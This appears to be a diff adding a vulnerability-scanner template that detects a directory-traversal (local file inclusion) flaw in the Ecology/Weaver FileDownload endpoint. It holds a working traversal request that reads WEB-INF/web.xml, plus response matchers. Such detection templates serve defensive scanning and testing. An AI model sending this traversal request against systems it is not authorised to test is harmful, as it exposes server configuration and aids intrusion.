@@ -1,0 +1,27 @@
+id: "ecology-filedownload-directory-traversal"
+name: "Ecology - Local File Inclusion"
+severity: "high"
+description: "Ecology is vulnerable to local file inclusion."
+tech:
+  - "generic"
+tags:
+  - "ecology"
+  - "lfi"
+  - "vuln"
+cwe: "CWE-23"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "status"
+    status:
+      - 200
+  - type: "word"
+    part: "body"
+    words:
+      - "<url-pattern>/weaver/"
